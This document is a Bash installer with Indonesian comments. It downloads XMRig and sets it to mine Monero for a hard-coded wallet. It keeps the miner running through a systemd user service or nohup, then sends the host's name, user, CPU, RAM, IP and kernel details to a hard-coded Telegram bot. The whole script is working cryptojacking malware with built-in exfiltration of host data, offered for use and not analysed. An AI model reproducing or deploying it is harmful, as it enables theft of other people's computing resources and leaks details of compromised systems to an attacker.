#!/usr/bin/env bash

set -euo pipefail

### === KONFIGURASI ===
WALLET="48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi"
TELEGRAM_TOKEN="7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw"
TELEGRAM_CHATID="5104210301"
POOL_URL="gulf.moneroocean.stream:10128"
XMRIG_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"

BASE_DIR="$(pwd)"
INSTALL_DIR="$BASE_DIR/moneroocean"
TARBALL="$BASE_DIR/xmrig.tar.gz"
LOGFILE="$INSTALL_DIR/xmrig.log"
SYSTEMD_SERVICE="xmrig.service"

### === FUNGSI BANTUAN ===
log() { printf '[%s] %s\n' "$(date '+%F %T')" "$*"; }

require_cmd() {
    if ! command -v "$1" >/dev/null 2>&1; then
        log "❌ Perintah '$1' tidak ditemukan, silakan install terlebih dahulu."
        exit 1
    fi
}

run_safe() { eval "$@" >/dev/null 2>&1 || true; }

### === CEK KEBUTUHAN DASAR ===
require_cmd tar
if command -v curl >/dev/null 2>&1; then
    DL_CMD="curl -fSL -o"
elif command -v wget >/dev/null 2>&1; then
    DL_CMD="wget -qO"
else
    log "❌ Tidak ada curl atau wget."
    exit 1
fi

### === DOWNLOAD & EKSTRAK ===
log "📦 Menyiapkan direktori instalasi..."
rm -rf "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR"

log "⬇️  Mengunduh XMRig dari $XMRIG_URL"
$DL_CMD "$TARBALL" "$XMRIG_URL"

log "📂 Mengekstrak ke $INSTALL_DIR"
tar -xzf "$TARBALL" -C "$INSTALL_DIR"
rm -f "$TARBALL"

### === KONFIGURASI ===
CONFIG="$INSTALL_DIR/config.json"
EXAMPLE="$INSTALL_DIR/config.json.example"
HOSTNAME="$(hostname)"

if [[ -f "$EXAMPLE" ]]; then
    cp -f "$EXAMPLE" "$CONFIG"
else
    cat > "$CONFIG" <<EOF
{
  "autosave": true,
  "cpu": { "enabled": true },
  "pools": [
    {
      "url": "$POOL_URL",
      "user": "$WALLET",
      "pass": "$HOSTNAME",
      "keepalive": true
    }
  ]
}
EOF
fi

# Update config via jq jika tersedia
if command -v jq >/dev/null 2>&1; then
    jq --arg url "$POOL_URL" \
       --arg user "$WALLET" \
       --arg pass "$HOSTNAME" \
       '.pools[0].url=$url | .pools[0].user=$user | .pools[0].pass=$pass | .["log-file"]=null' \
       "$CONFIG" > "$CONFIG.tmp" && mv "$CONFIG.tmp" "$CONFIG"
fi

### === TENTUKAN PATH XMRIG ===
XMRIG_BIN="$(find "$INSTALL_DIR" -type f -name xmrig -perm /111 | head -n1 || true)"
if [[ -z "$XMRIG_BIN" ]]; then
    log "❌ Binary xmrig tidak ditemukan."
    exit 1
fi
chmod +x "$XMRIG_BIN"

### === CEK KEMAMPUAN SYSTEMD --USER ===
USE_SYSTEMD=0
if command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then
    USE_SYSTEMD=1
    log "✅ systemd --user tersedia, akan digunakan untuk menjalankan service."
else
    log "⚠️  systemd --user tidak tersedia, akan menggunakan fallback nohup."
fi

### === JIKA SYSTEMD DIDUKUNG ===
if [[ "$USE_SYSTEMD" -eq 1 ]]; then
    SYSTEMD_DIR="$HOME/.config/systemd/user"
    mkdir -p "$SYSTEMD_DIR"

    cat > "$SYSTEMD_DIR/$SYSTEMD_SERVICE" <<EOF
[Unit]
Description=XMRig Miner (User Service)
After=network-online.target

[Service]
ExecStart=$XMRIG_BIN --config=$CONFIG
WorkingDirectory=$INSTALL_DIR
Restart=always
RestartSec=10
Nice=10
StandardOutput=append:$LOGFILE
StandardError=append:$LOGFILE

[Install]
WantedBy=default.target
EOF

    systemctl --user daemon-reload
    systemctl --user enable "$SYSTEMD_SERVICE" >/dev/null 2>&1 || true
    systemctl --user restart "$SYSTEMD_SERVICE"

    sleep 2
    STATUS=$(systemctl --user is-active "$SYSTEMD_SERVICE" || echo "inactive")
    log "🔧 Status systemd service: $STATUS"

else
    ### === FALLBACK: NOHUP ===
    log "🚀 Menjalankan XMRig di background dengan nohup..."
    nohup "$XMRIG_BIN" --config="$CONFIG" >"$LOGFILE" 2>&1 &
    sleep 1
fi

### === KIRIM NOTIFIKASI TELEGRAM ===
require_cmd curl
PID_LIST=$(pgrep -f "$XMRIG_BIN" || echo "-")
CPU_INFO=$(lscpu | grep 'Model name' | head -1 | cut -d: -f2 | xargs)
RAM_INFO=$(free -h | awk '/Mem:/ {print $2 " total, " $3 " used"}')
SYS_INFO=$(uname -a)
IP_INFO=$(hostname -I | awk '{print $1}')

MESSAGE=$(cat <<EOF
✅ <b>XMRig Berhasil Dijalankan</b>
🖥️ <b>Hostname</b>: <code>$HOSTNAME</code>
👤 <b>User</b>: $(whoami)
🧠 <b>CPU</b>: $CPU_INFO
📦 <b>RAM</b>: $RAM_INFO
🌐 <b>IP</b>: $IP_INFO
🔧 <b>System</b>: <code>$SYS_INFO</code>
⛏️ <b>PID</b>: <code>$PID_LIST</code>
EOF
)

curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
     -d "chat_id=${TELEGRAM_CHATID}" \
     -d "text=${MESSAGE}" \
     -d "parse_mode=HTML" >/dev/null || true

log "📨 Notifikasi Telegram dikirim."
log "✅ Instalasi selesai. Log: $LOGFILE"
